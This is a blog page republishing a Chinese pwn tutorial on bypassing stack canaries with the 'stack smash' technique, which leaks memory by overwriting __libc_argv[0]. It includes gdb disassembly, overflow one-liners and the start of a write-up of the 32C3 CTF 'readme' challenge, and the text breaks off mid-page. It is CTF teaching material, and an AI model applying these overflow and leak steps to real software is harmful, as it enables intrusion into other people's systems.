<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="Access-Control-Allow-Origin" content="*"><script type="text/javascript">var start_time=(new Date).getTime()</script><meta http-equiv="Cache-Control" content="no-cache"><meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"><meta name="viewport" content="initial-scale=1,maximum-scale=1,user-scalable=no"><meta name="google-site-verification" content="9Wt3lmnrT2bfjaHla5s16adhvcQcBHO7PtNf97n5Od0"><meta name="baidu-site-verification" content="RYlYHsgO7Y"><meta name="sogou_site_verification" content="MSmrTj7lHV"><meta name="shenma-site-verification" content="e4428ccce0f22fad61c3716193bf4bd7_1571416388"><meta name="baidu_union_verify" content="584bb6b4bd24108df082b6d20c7aa9be"><title>推荐系列-栈溢出技巧（下） | 狂欢马克思</title><meta name="keywords" content="分享技术经验与交流"><meta name="description" content="&amp;emsp;&amp;emsp;基于报错类的栈保护 canary这个值被称作金丝雀(“canary”)值，指的是矿工曾利用金丝雀来确认是否有气体泄漏，如果金丝雀因为气体泄漏而中毒死亡，可以给矿工预警。在brop中也提到过，通过爆…"><meta property="og:type" content="article"><meta property="og:title" content="推荐系列-栈溢出技巧（下）"><meta property="og:url" content="https://www.hosiang.cn/aeff58fe/index.html"><meta property="og:site_name" content="狂欢马克思"><meta property="og:description" content="&amp;emsp;&amp;emsp;基于报错类的栈保护 canary这个值被称作金丝雀(“canary”)值，指的是矿工曾利用金丝雀来确认是否有气体泄漏，如果金丝雀因为气体泄漏而中毒死亡，可以给矿工预警。在brop中也提到过，通过爆…"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=ae049e09-2ea3-4143-a7d4-4971a19aec22.png"><meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=ae049e09-2ea3-4143-a7d4-4971a19aec22.png"><meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=ae049e09-2ea3-4143-a7d4-4971a19aec22.png"><meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=ae049e09-2ea3-4143-a7d4-4971a19aec22.png"><meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=ae049e09-2ea3-4143-a7d4-4971a19aec22.png"><meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=ae049e09-2ea3-4143-a7d4-4971a19aec22.png"><meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=ae049e09-2ea3-4143-a7d4-4971a19aec22.png"><meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=ae049e09-2ea3-4143-a7d4-4971a19aec22.png"><meta property="article:published_time" content="2021-04-15T02:08:52.000Z"><meta property="article:modified_time" content="2022-06-22T09:43:14.413Z"><meta property="article:author" content="Howe Hsiang"><meta property="article:tag" content="Popular"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://www.hetianlab.com/specialized/headImg.action?news=ae049e09-2ea3-4143-a7d4-4971a19aec22.png"><link rel="icon" href="/images/favicon.ico"><link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"><link href="https://cdn.bootcss.com/font-awesome-animation/0.1.0/font-awesome-animation.min.css" rel="stylesheet"><link rel="stylesheet" href="/css/style.css"><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?3cd8fa109426bf3f10bd5c362175bace";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script></script><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 6.2.0"></head><script src="/js/jquery.min.js"></script><script src="/js/pace.min.js"></script><script src="/js/crypto-js.js"></script><script src="/js/cookie.js"></script><script src="/js/calendar.js"></script><script src="/js/festival.js"></script><script>getFestival()</script><body><script>window.onload=function(){document.getElementById("TimeShow").innerHTML="本站耗时 "+((new Date).getTime()-start_time)/1e3+" 秒 "}</script><div id="container"><header id="header"><div id="banner"></div><div id="header-outer"><div id="header-menu" class="header-menu-pos animated"><div class="header-menu-container"><a href="/" class="left"><span class="site-title">狂欢马克思</span></a><nav id="header-menu-nav" class="right"><a href="/" rel="external nofollow"><i class="fa fa-home"></i> <span>主页</span> </a><a href="/archives" rel="external nofollow"><i class="fa fa-archive"></i> <span>归档</span> </a><a href="/gitbook" rel="external nofollow"><i class="fa fa-columns"></i> <span>笔记</span> </a><a href="/music" rel="external nofollow"><i class="fa fa-music"></i> <span>音乐</span> </a><a href="/photo" rel="external nofollow"><i class="fa fa-picture-o"></i> <span>相册</span> </a><a href="/love" rel="external nofollow"><i class="fa fa-heart"></i> <span>恋爱</span> </a><a href="/collection" rel="external nofollow"><i class="fa fa-envira"></i> <span>收藏</span> </a><a href="/about" rel="external nofollow"><i class="fa fa-user"></i> <span>关于</span></a></nav><a class="mobile-header-menu-button"><i class="fa fa-bars"></i></a></div></div><div id="header-row"><div id="logo"><a href="/"><img src="/../images/logo.png" alt="logo"></a></div><div class="header-info"><div id="header-title"><h2>狂欢马克思</h2></div><div id="header-description"><h3>专注Web开发</h3></div></div><nav class="header-nav"><div class="social"><a title="Github" target="_blank" href="//github.com/Hosiang1026" rel="external nofollow"><i class="fa fa-github fa-2x"></i></a> <a title="QQ" target="_blank" href="//wpa.qq.com/msgrd?v=3&uin=641904695&site=qq&menu=yes" rel="external nofollow"><i class="fa fa-qq fa-2x"></i></a> <a title="Weibo" target="_blank" href="//www.weibo.com/haoxiang969" rel="external nofollow"><i class="fa fa-weibo fa-2x"></i></a></div></nav></div><script type="text/javascript" src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script><div id="noticeId" class="show" style="background:rgb(244,247,247,.3)"><marquee id="noticeMar" behavior="scoll" class="notice" direction="left" onmouseover="this.stop()" onmouseout="this.start()"></marquee></div><script type="text/javascript">function browserRedirect(){var i=navigator.userAgent.toLowerCase(),n="ipad"==i.match(/ipad/i),e="iphone os"==i.match(/iphone os/i),o="midp"==i.match(/midp/i),a="rv:1.2.3.4"==i.match(/rv:1.2.3.4/i),s="ucweb"==i.match(/ucweb/i),t="android"==i.match(/android/i),r="windows ce"==i.match(/windows ce/i),c="windows mobile"==i.match(/windows mobile/i),d="",m=randomColor(),d=n||e||o||a||s||t||r||c?($("#noticeId").css({"line-height":"1.6em"}),"<font style='color:"+m+"' face='新华宋体'  size='2'>官宣：<span id='msg'></span><span id='timer'></span><span id='jinrishici-sentence'></span></font> "):($("#noticeId").css({"line-height":"3.6em","margin-top":"20px"}),"<font style='color:"+m+"' face='新华宋体'  size='6'>官宣：<span id='weekend'></span><span id='msg'></span><span id='timer'></span><span id='jinrishici-sentence'></span></font> ");$("#noticeMar").html(d)}function randomColor(){for(var i="0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f".split(","),n="#",e=0;e<6;e++)n+=i[Math.floor(16*Math.random())];return n}$(function(){browserRedirect()})</script></div></header><script>console.log=function(){}</script><div class="outer"><section id="main" class="body-wrap"><article id="post-栈溢出技巧（下）" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-inner"><header class="article-header"><h1 class="post-title" itemprop="name">推荐系列-栈溢出技巧（下）</h1><div class="post-title-bar"><ul><li><i class="fa fa-book"></i> <a href="/categories/热门文章/">热门文章</a></li><li><i class="fa fa-calendar"></i> 2021-04-15</li><li><i class="fa fa-eye"></i> <span id="busuanzi_value_page_pv"></span></li><li><span class="post-count">字数统计: 11.4k字</span></li><li><span class="post-count">阅读时长: 54分钟</span></li></ul></div></header><div class="article-entry post-content" itemprop="articleBody"><p>&amp;emsp;&amp;emsp;基于报错类的栈保护 canary这个值被称作金丝雀(“canary”)值，指的是矿工曾利用金丝雀来确认是否有气体泄漏，如果金丝雀因为气体泄漏而中毒死亡，可以给矿工预警。在brop中也提到过，通过爆…</p><span id="more"></span><h5 id="基于报错类的栈保护"><a href="#基于报错类的栈保护" class="headerlink" title="基于报错类的栈保护"></a>基于报错类的栈保护</h5><p>canary这个值被称作金丝雀(“canary”)值，指的是矿工曾利用金丝雀来确认是否有气体泄漏，如果金丝雀因为气体泄漏而中毒死亡，可以给矿工预警。在brop中也提到过，通过爆破的办法去进行绕过canary保护，因为canary的值在每次程序运行时都是不同的，所以这需要一定的条件：fork的子进程不变，题目中很难遇到，所以我们可以使用stack smash的方法进行泄漏内容。canary位置位于高于局部变量，低于ESP，也就是在其中间，那么我们进行溢出攻击的时候，都会覆盖到canary的值，从而导致程序以外结束。具体看一下canary在哪？怎么形成的？又是怎么使用的？举一个小例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  #include &lt;stdio.h&gt;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line">    scanf(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line">pwn<span class="meta">@pwn</span>-PC:~/Desktop$ gcc test.c -fstack-protector</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看一下其汇编代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">  Dump of assembler code <span class="keyword">for</span> function main:</span><br><span class="line">   <span class="number">0x0000000000000740</span> &lt;+<span class="number">0</span>&gt;: push   rbp</span><br><span class="line">   <span class="number">0x0000000000000741</span> &lt;+<span class="number">1</span>&gt;: mov    rbp,rsp</span><br><span class="line">   <span class="number">0x0000000000000744</span> &lt;+<span class="number">4</span>&gt;: sub    rsp,<span class="number">0x30</span></span><br><span class="line">   <span class="number">0x0000000000000748</span> &lt;+<span class="number">8</span>&gt;: mov    DWORD PTR [rbp-<span class="number">0x24</span>],edi</span><br><span class="line">   <span class="number">0x000000000000074b</span> &lt;+<span class="number">11</span>&gt;:    mov    QWORD PTR [rbp-<span class="number">0x30</span>],rsi</span><br><span class="line">   <span class="number">0x000000000000074f</span> &lt;+<span class="number">15</span>&gt;:    mov    rax,QWORD PTR fs:<span class="number">0x28</span></span><br><span class="line">   <span class="number">0x0000000000000758</span> &lt;+<span class="number">24</span>&gt;:    mov    QWORD PTR [rbp-<span class="number">0x8</span>],rax</span><br><span class="line">   <span class="number">0x000000000000075c</span> &lt;+<span class="number">28</span>&gt;:    xor    eax,eax</span><br><span class="line">   <span class="number">0x000000000000075e</span> &lt;+<span class="number">30</span>&gt;:    lea    rax,[rbp-<span class="number">0x12</span>]</span><br><span class="line">   <span class="number">0x0000000000000762</span> &lt;+<span class="number">34</span>&gt;:    mov    rsi,rax</span><br><span class="line">   <span class="number">0x0000000000000765</span> &lt;+<span class="number">37</span>&gt;:    lea    rdi,[rip+<span class="number">0xb8</span>]        # <span class="number">0x824</span></span><br><span class="line">   <span class="number">0x000000000000076c</span> &lt;+<span class="number">44</span>&gt;:    mov    eax,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000000771</span> &lt;+<span class="number">49</span>&gt;:    call   <span class="number">0x5f0</span> &lt;__isoc99_scanf<span class="meta">@plt</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000000776</span> &lt;+<span class="number">54</span>&gt;:    mov    rax,QWORD PTR [rbp-<span class="number">0x30</span>]</span><br><span class="line">   <span class="number">0x000000000000077a</span> &lt;+<span class="number">58</span>&gt;:    lea    rdx,[rip+<span class="number">0xa6</span>]        # <span class="number">0x827</span></span><br><span class="line">   <span class="number">0x0000000000000781</span> &lt;+<span class="number">65</span>&gt;:    mov    QWORD PTR [rax],rdx</span><br><span class="line">   <span class="number">0x0000000000000784</span> &lt;+<span class="number">68</span>&gt;:    nop</span><br><span class="line">   <span class="number">0x0000000000000785</span> &lt;+<span class="number">69</span>&gt;:    mov    rax,QWORD PTR [rbp-<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x0000000000000789</span> &lt;+<span class="number">73</span>&gt;:    xor    rax,QWORD PTR fs:<span class="number">0x28</span></span><br><span class="line">   <span class="number">0x0000000000000792</span> &lt;+<span class="number">82</span>&gt;:    je     <span class="number">0x799</span> &lt;main+<span class="number">89</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000000794</span> &lt;+<span class="number">84</span>&gt;:    call   <span class="number">0x5e0</span> &lt;__stack_chk_fail<span class="meta">@plt</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000000799</span> &lt;+<span class="number">89</span>&gt;:    leave  </span><br><span class="line">   <span class="number">0x000000000000079a</span> &lt;+<span class="number">90</span>&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>找到&lt;+15&gt; &lt;+24&gt;和&lt;+69&gt;&lt;+73&gt;处</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">     <span class="number">0x000000000000074f</span> &lt;+<span class="number">15</span>&gt;:    mov    rax,QWORD PTR fs:<span class="number">0x28</span></span><br><span class="line">   <span class="number">0x0000000000000758</span> &lt;+<span class="number">24</span>&gt;:    mov    QWORD PTR [rbp-<span class="number">0x8</span>],rax</span><br><span class="line">.....</span><br><span class="line">   <span class="number">0x0000000000000785</span> &lt;+<span class="number">69</span>&gt;:    mov    rax,QWORD PTR [rbp-<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x0000000000000789</span> &lt;+<span class="number">73</span>&gt;:    xor    rax,QWORD PTR fs:<span class="number">0x28</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前两处是生成canary并且存在[rbp-0x8]中，怎是通过从fs:0x28的地方获取的，而且发现每次都会变化，无法预测。后两处则是程序执行完成后对[rbp-0x8]canary值与fs:0x28的值进行比较，如果xor操作后rax寄存器中值为0，那么程序自己就认为是没有被破坏，否则调用__stack_chk_fail函数。继续看该函数的内容和作用，会引出stack smash利用技巧。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   __attribute__ ((noreturn)) </span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>) &#123;   </span><br><span class="line">    __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">__attribute__</span> <span class="params">((noreturn)</span>) </span><br><span class="line">__fortify_fail (msg)</span><br><span class="line">   const <span class="type">char</span> *msg; &#123;</span><br><span class="line">      <span class="comment">/* The loop is added only to keep gcc happy. */</span></span><br><span class="line">         <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">              __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>, msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>) </span><br><span class="line">&#125; </span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终会调用fortify_fail函数中的libc_message (2, “* %s : %s terminated\n”, msg, __libc_argv[0] ?: “<unknown>“) ，关键点来了。一、可以打印信息二、__libc_argv[0]可控制那么__libc_argv[0]是什���呢？与打印信息又什么联系？libc_argv[0]则是 argv[ ]指针组的的元素，先看 main函数的原型，void main(int argc, char *argv)。其中参数argc是整数，表示使用命令行运行程序时传递了几个参数； argv[ ]是一个指针数组，用来存放指向你的字符串参数的指针，每一个元素指向一个参数。其中argv[0]指向程序运行的全路径名，也就是程序的名字，比如例子中的.&#x2F;a.out，argv[1] 指向在命令行中执行程序名后的第一个字符串，以此类推。但是这样看来，libc_argv[0]似乎是不可以控制的，或者只能使用修改程序名来进行控制。继续看这么一个小实验，先看一下这个错误信息是怎么打印的（至于为什么是输出50个字节，随后再探究）。</unknown></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  pwn<span class="meta">@pwn</span>-PC:~/Desktop$ python -c <span class="string">&#x27;print &quot;A&quot;*50&#x27;</span> | ./a.out</span><br><span class="line">*** stack smashing detected ***: ./a.out terminated</span><br><span class="line">段错误</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果我们在程序中强行修改__libc_argv[0]会怎么样？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  #include &lt;stdio.h&gt;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line">    scanf(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    argv[<span class="number">0</span>] = <span class="string">&quot;stack smash!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">pwn<span class="meta">@pwn</span>-PC:~/Desktop$ gcc test.c -fstack-protector</span><br><span class="line">pwn<span class="meta">@pwn</span>-PC:~/Desktop$ python -c <span class="string">&#x27;print &quot;A&quot;*50&#x27;</span> | ./a.out</span><br><span class="line">*** stack smashing detected ***: stack smash! terminated</span><br><span class="line">段错误</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以发现成功控制了__libc_argv[0]的值，打印出来了想要的信息。综上所述，这一种基于报错类的栈保护，恰恰是可以报错，所以存在stack smash的绕过方法。</p><h3 id="stack-smash原理"><a href="#stack-smash原理" class="headerlink" title="stack smash原理"></a>stack smash原理</h3><p>调试fortify_fail 函数，找到libc_message函数的部分汇编代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7b331d0</span> &lt;__fortify_fail+<span class="number">16</span>&gt;    mov    rax, qword ptr [rip + <span class="number">0x2a5121</span>] &lt;<span class="number">0x7ffff7dd82f8</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后获取[rip+0x2a5121]的值，也就是存放__libc_argv[0]的内存单元。<br><img src="https://www.hetianlab.com/specialized/headImg.action?news=ae049e09-2ea3-4143-a7d4-4971a19aec22.png" alt="Test" title="栈溢出技巧（下）"><br>对于这个例子来说，输入的长度达到0xf8字节，即可开始覆盖__libc_argv[0]的值，从而打印出来需要的信息，构造就相应的payload就行泄漏想要的内容，比如存储的flag内容、开启PIE的加载基址、canary的值等等。在一节里面，拿刚才的例子再做一个有意思的小实验：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  pwn<span class="meta">@pwn</span>-PC:~/Desktop$ python -c <span class="string">&#x27;print &quot;A&quot;*247&#x27;</span> | ./a.out</span><br><span class="line">*** stack smashing detected ***: ./a.out terminated</span><br><span class="line">段错误</span><br><span class="line">pwn<span class="meta">@pwn</span>-PC:~/Desktop$ python -c <span class="string">&#x27;print &quot;A&quot;*248&#x27;</span> | ./a.out</span><br><span class="line">*** stack smashing detected ***:  terminated</span><br><span class="line">段错误</span><br><span class="line">pwn<span class="meta">@pwn</span>-PC:~/Desktop$ python -c <span class="string">&#x27;print &quot;A&quot;*249&#x27;</span> | ./a.out</span><br><span class="line">*** stack smashing detected ***:  terminated</span><br><span class="line">段错误</span><br><span class="line">pwn<span class="meta">@pwn</span>-PC:~/Desktop$ python -c <span class="string">&#x27;print &quot;A&quot;*250&#x27;</span> | ./a.out</span><br><span class="line">段错误</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>buf(0x7fffffffcd00)和__libc_argv0处相距0xf8（也就是说第249位会覆盖到0x7fffffffcdf8），那么输入247、248、249、250会出现三种情况，分别看一下对应情况下0x7fffffffcdf8的值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  达不到覆盖的距离：    </span><br><span class="line"><span class="number">21</span>:0108│      <span class="number">0x7fffffffcdf8</span> —▸ <span class="number">0x7fffffffd0d2</span> ◂— <span class="string">&#x27;/home/pwn/Desktop/a.out&#x27;</span></span><br><span class="line">刚好达到覆盖的距离，读入\x00刚好覆盖到：</span><br><span class="line"><span class="number">21</span>:0108│      <span class="number">0x7fffffffcdf8</span> —▸ <span class="number">0x7fffffffd000</span> ◂— <span class="number">9</span> <span class="comment">/* &#x27;\t&#x27; */</span></span><br><span class="line">覆盖形成的地址在内存中可以找到：</span><br><span class="line"><span class="number">21</span>:0108│      <span class="number">0x7fffffffcdf8</span> —▸ <span class="number">0x7fffffff0041</span> ◂— <span class="number">0x0</span></span><br><span class="line">Cannot access memory at address <span class="number">0x7fffff004141</span>：</span><br><span class="line"><span class="number">21</span>:0108│      <span class="number">0x7fffffffcdf8</span> ◂— <span class="number">0x7fffff004141</span> <span class="comment">/* &#x27;AA&#x27; */</span>  </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因此在尝试寻找offset的时候，选择offset &#x3D; 248。当然尝试的办法太慢了，直接gdb调试下断点，类似于例子中的distance 0x7fffffffcd00 0x7fffffffcdf8即可。</p><h3 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h3><p>2015 年 32C3 CTF readme题目分析如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">  unsigned __int64 <span class="title function_">sub_4007E0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-128h]</span></span><br><span class="line">  unsigned __int64 v4; <span class="comment">// [rsp+108h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(0x28u);</span><br><span class="line">  __printf_chk(1LL, <span class="string">&quot;Hello!\nWhat&#x27;s your name? &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !_IO_gets(&amp;v3) )</span><br><span class="line">LABEL_9:</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  v0 = 0LL;</span><br><span class="line">  __printf_chk(1LL, <span class="string">&quot;Nice to meet you, %s.\nPlease overwrite the flag: &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = _IO_getc(stdin);</span><br><span class="line">    <span class="keyword">if</span> ( v1 == -<span class="number">1</span> )</span><br><span class="line">      goto LABEL_9;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    byte_600D20[v0++] = v1;</span><br><span class="line">    <span class="keyword">if</span> ( v0 == <span class="number">32</span> )</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  memset((<span class="keyword">void</span> *)((signed <span class="type">int</span>)v0 + 6294816LL), <span class="number">0</span>, (unsigned <span class="type">int</span>)(<span class="number">32</span> - v0));</span><br><span class="line">LABEL_8:</span><br><span class="line">  puts(<span class="string">&quot;Thank you, bye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(0x28u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwn<span class="meta">@pwn</span>-PC:~/Desktop$ ./readme.bin </span><br><span class="line">Hello!</span><br><span class="line">What<span class="string">&#x27;s your name? aaa</span></span><br><span class="line"><span class="string">Nice to meet you, aaa.</span></span><br><span class="line"><span class="string">Please overwrite the flag: aaa</span></span><br><span class="line"><span class="string">Thank you, bye!</span></span><br><span class="line"><span class="string">pwn@pwn-PC:~/Desktop$ checksec readme.bin </span></span><br><span class="line"><span class="string">[*] &#x27;</span>/home/pwn/Desktop/readme.bin<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="string">    RELRO:    No RELRO</span></span><br><span class="line"><span class="string">    Stack:    Canary found</span></span><br><span class="line"><span class="string">    NX:       NX enabled</span></span><br><span class="line"><span class="string">    PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="string">    FORTIFY:  Enabled</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>程序中存在两次输入，并且可以发现_IO_gets(&amp;v3)处存在明显的栈溢出。尝试找到__libc_argv[0]的位置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  pwn<span class="meta">@pwn</span>-PC:~/Desktop$ python -c <span class="string">&#x27;print &quot;A&quot;*0x128+&quot;\n&quot;&#x27;</span>|./readme.bin</span><br><span class="line">Hello!</span><br><span class="line">What<span class="string">&#x27;s your name? Nice to meet you, AAAAAAAA...</span></span><br><span class="line"><span class="string">Please overwrite the flag: Thank you, bye!</span></span><br><span class="line"><span class="string">*** stack smashing detected ***: ./readme.bin terminated</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwn@pwn-PC:~/Desktop$ python -c &#x27;</span>print <span class="string">&quot;A&quot;</span>*<span class="number">535</span>+<span class="string">&quot;\n&quot;</span><span class="string">&#x27;|./readme.bin</span></span><br><span class="line"><span class="string">Hello!</span></span><br><span class="line"><span class="string">What&#x27;</span>s your name? Nice to meet you, AAAAAAAA...</span><br><span class="line">Please overwrite the flag: Thank you, bye!</span><br><span class="line">*** stack smashing detected ***: ./readme.bin terminated</span><br><span class="line"></span><br><span class="line">pwn<span class="meta">@pwn</span>-PC:~/Desktop$ python -c <span class="string">&#x27;print &quot;A&quot;*536+&quot;\n&quot;&#x27;</span>|./readme.bin</span><br><span class="line">Hello!</span><br><span class="line">What<span class="string">&#x27;s your name? Nice to meet you, AAAAAAAA...</span></span><br><span class="line"><span class="string">Please overwrite the flag: Thank you, bye!</span></span><br><span class="line"><span class="string">*** stack smashing detected ***:   terminated</span></span><br><span class="line"><span class="string"></span></span><br><span 